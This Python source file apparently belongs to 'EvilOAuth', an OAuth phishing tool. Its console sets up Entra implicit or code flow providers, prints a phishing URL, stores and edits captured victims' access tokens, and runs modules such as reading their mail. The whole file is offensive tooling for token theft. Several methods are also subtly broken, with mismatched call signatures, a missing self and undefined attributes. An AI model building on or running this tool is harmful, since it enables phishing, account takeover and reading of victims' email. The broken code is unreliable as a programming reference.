import sys
import logging
from diskcache import Cache
from eviloauth.idp import IDP
from eviloauth.exceptions import EviloauthCommandException
from eviloauth.access_token import AccessToken
from eviloauth import app, cache, temp_dir, load_modules
from datetime import datetime, timedelta

class TokenManager:
    def __init__(self, cache_dir):
        self.cache = Cache(cache_dir)

    def add(self, access_token):
        if isinstance(access_token, AccessToken):
            token_key = str(access_token)
            self.cache.set(token_key, access_token)
            return token_key
        else:
            logging.error("Invalid access token object")
            return None

    def delete(self, token_key):
        if token_key in self.cache:
            self.cache.delete(token_key)
            return True
        return False

    def list(self):
        return [key for key in self.cache.keys()]

    def update_upn(self, token_key, new_upn):
        token = self.cache.get(token_key)
        if token and not token.is_jwt:  
            new_token_key = f'OAT-{new_upn}'
            token.set_upn(new_upn)
            self.cache.set(new_token_key, token)
            self.cache.delete(token_key)
            print(f"UPN and key updated for OAT token. New key: {new_token_key}")
        else:
            print("UPN update is not applicable for JWT tokens.")
    
    def update_scope(self, token_key, new_scope):
        token = self.cache.get(token_key)
        if token and not token.is_jwt:
            token.set_scope(new_scope)
            self.cache.set(token_key, token)
            print(f"Scope updated for OAT token: {token_key}")
        else:
            print("Scope update is not applicable for JWT tokens.")

    def update_expiry(self, token_key, time_str):
        token = self.cache.get(token_key)
        if token and not token.is_jwt:
            try:
                hours = int(time_str[:2])
                minutes = int(time_str[2:])
                new_expiry = datetime.utcnow() + timedelta(hours=hours, minutes=minutes)
                token.set_expiry(new_expiry)
                self.cache.set(token_key, token)
                print(f"Expiry updated to {new_expiry} for OAT token: {token_key}")
            except (ValueError, IndexError):
                print("Invalid time format. Please enter time as HHMM.")
        else:
            print("Expiry update is not applicable for JWT tokens.")  
    
    def handle_callback(token):
        token_key = token_manager.add(token)  # Adds token to cache and returns a key
        logging.info(f"Token added with key: {token_key}")

class Dispatcher:
    instance = None
    
    def __init__(self, flask_server, module_dict, redirect_server):
        self.flask_server = flask_server
        self.module_dict = module_dict
        self.redirect_server = redirect_server
        self.token_manager = TokenManager(temp_dir)
        self.idp_instance = None
        self.phishing_url = None
        Dispatcher.instance = self
        
    @classmethod
    def get_token_manager(cls):
        if cls.instance:
            return cls.instance.token_manager
        else:
            return None

    def dispatch(self, commands):
        cmd_parts = commands.split(' ')
        cmd = cmd_parts[0]
        cmd_args = cmd_parts[1:]

        if cmd == 'exit':
            self.dispatch_exit()

        elif cmd == 'module':
            self.dispatch_module(cmd_args)  # Assuming dispatch_module accepts a list of args

        elif cmd == 'tokens':
            self.dispatch_tokens(cmd_args)  # Handles all token-related commands

        elif cmd == 'configure':
            self.dispatch_configure(cmd_args)  # Pass the entire list of arguments

        elif cmd == 'target':
            self.dispatch_target(cmd_args)  # Handles target-related commands

        elif cmd == 'url':
            self.dispatch_url()  # Displays the phishing URL

        elif cmd == 'help':
            self.dispatch_help(cmd_args)  # Displays help information

        else:
            raise EviloauthCommandException(f'Unknown command {cmd}')

    def dispatch_exit(self):
        print('Exiting...')
        self.flask_server.shutdown()
        sys.exit()

    def dispatch_module(self, cmd, sub, arg):
        mod = self.module_dict[f'eviloauth.{cmd}.{sub}.{arg}']
        mod.__run__(self.cache.get('target'), 0)

    def dispatch_tokens(self, cmd_args):
        if len(cmd_args) >= 1:
            if cmd_args[0] == 'list':
                self.handle_tokens_list(cmd_args)
            elif len(cmd_args) >= 4 and cmd_args[1] == 'set':
                self.handle_tokens_set(cmd_args)
            elif len(cmd_args) == 2 and cmd_args[0] == 'delete':
                self.handle_tokens_delete(cmd_args)
            else:
                print(f"Invalid or unrecognised subcommand: {cmd_args[0]}")

    def handle_tokens_list(self, cmd_args):
        if len(cmd_args) > 1:
            token_key = cmd_args[1]
            token_obj = self.token_manager.cache.get(token_key)
            if token_obj:
                print(f"Details for token {token_key}:")
                print(f"  User Principal Name (UPN): {getattr(token_obj, 'upn', 'N/A')}")
                print(f"  Scope: {getattr(token_obj, 'scp', 'N/A')}")

                # Check if 'expiry' information is available
                expiry_info = token_obj.get_time_until_expiry() if hasattr(token_obj, 'get_time_until_expiry') else 'N/A'
                print(f"  Expiry: {expiry_info}")

                # Issued at information
                issued_at = f"{getattr(token_obj, 'today', 'N/A')} at {getattr(token_obj, 'time', 'N/A')}"
                print(f"  Issued at: {issued_at}")
            else:
                print(f"No token found for key: {token_key}")
        else:
            # List all token keys
            all_keys = [key for key in self.token_manager.cache.iterkeys()]
            token_keys = [key for key in all_keys if key not in ['target', 'tokens']]
            print("Available token keys:")
            for key in token_keys:
                print(key)

    def handle_tokens_set(self, cmd_args):
        if len(cmd_args) >= 4 and cmd_args[1] == 'set':
            token_key = cmd_args[0]
            action = cmd_args[2]
            if action == 'upn':
                new_upn = cmd_args[3]
                self.token_manager.update_upn(token_key, new_upn)
            elif action == 'scope':
                new_scope = cmd_args[3]
                self.token_manager.update_scope(token_key, new_scope)
            elif action == 'expiry':
                if len(cmd_args[3]) == 4 and cmd_args[3].isdigit():
                    new_expiry = cmd_args[3]
                    self.token_manager.update_expiry(token_key, new_expiry)
                else:
                    print("Invalid time format. Please enter time as HHMM.")
            else:
                print(f"Invalid format for 'add {action}' subcommand.")

    def handle_tokens_delete(self, cmd_args):
        if len(cmd_args) == 2 and cmd_args[0] == 'delete':
            token_key = cmd_args[1]
            if self.token_manager.delete(token_key):
                print(f"Token {token_key} deleted successfully.")
            else:
                print(f"Token {token_key} not found or could not be deleted.")

    def dispatch_configure(self, cmd_args):
        if len(cmd_args) >= 2:
            # Extract subcommand and its argument
            sub = cmd_args[0]
            arg = cmd_args[1]

            # Implement the logic for different subcommands
            if sub == 'idp':
                if arg in ['entra_implicit_flow', 'entra_code_flow']:
                    self.idp_instance = IDP(arg, self.redirect_server)
                    self.phishing_url = self.idp_instance.get_phishing_url()
                    logging.info(f"Phishing URL set: {self.phishing_url}")
                else:
                    logging.error(f"IDP {arg} is not supported. Supported IDPs: ['entra_implicit_flow', 'entra_code_flow']")
            # Add other subcommands if necessary
        else:
            logging.error("Invalid arguments for configure command")

    def dispatch_target(self, cmd, sub, arg):
        target = self.cache.get('target')
        tokens = self.cache.get('tokens')

        if sub == 'list':
            print(f'Current Target: {target}')

        elif sub == 'set':
            if arg in tokens.keys():
                access_token = tokens[arg]
                self.cache.set('target', access_token)

            elif arg not in tokens.keys():
                raise EviloauthCommandException(f'Unknown token {arg}')

    def dispatch_url(self):
        if self.phishing_url:
            print(f"Phishing URL:\n{self.phishing_url}")
        else:
            print("Phishing URL not set. Please run 'configure idp' first.")

    def dispatch_help(self, cmd_args):
        if not cmd_args or len(cmd_args) == 0:
            self.display_general_help()
        elif cmd_args[0] == 'modules':
            self.display_modules_help()
        elif cmd_args[0] == 'tokens':
            self.display_tokens_help()
        elif cmd_args[0] == 'configure':
            self.display_configure_help()
        elif cmd_args[0] == 'url':
            self.display_url_help()
        else:
            print(f"No specific help available for '{cmd_args[0]}'")

    def display_general_help(self):
        help_text = """
        EvilOAuth General Help:

        Commands:
        - exit: Exits the application.
        - modules: Manages different modules.
        - tokens: Manages tokens.
        - configure: Configures the Identity Provider.
        - url: Displays the phishing URL.
        - help: Displays help information.

        For detailed help on specific commands, type 'help <command>'.
        """
        print(help_text)

    def display_modules_help(self):
        help_text = """
        Modules Command Help:

        Usage: modules <module_name> <sub_module_name> <sub_module_action>

        - Runs a specified module.
        - Example: modules read_mail imap read
        """
        print(help_text)

    def display_tokens_help(self):
        help_text = """
        Tokens Command Help:

        Usage: tokens <subcommand> [<args>]

        Subcommands:
        - list [<token_key>]: Lists all tokens or details of a specific token.
        - set <token_key> <attribute> <value>: Updates attributes of a token.
        - delete <token_key>: Deletes a specified token.

        Attributes for 'set' subcommand:
        - upn: Updates the User Principal Name.
        - scope: Updates the scope.
        - expiry: Updates the expiry time in HHMM format.

        Example: tokens set OAT-example upn new-upn@example.com
        """
        print(help_text)

    def display_configure_help(self):
        help_text = """
        Configure Command Help:

        Usage: configure idp <idp_name>

        - Configures the Identity Provider.
        - Supported IDPs: entra_implicit_flow, entra_code_flow
        - Example: configure idp entra_implicit_flow
        """
        print(help_text)

    def display_url_help(self):
        help_text = """
        URL Command Help:

        Usage: url

        - Displays the phishing URL if set.
        - Requires running 'configure idp' command first.
        """
        print(help_text)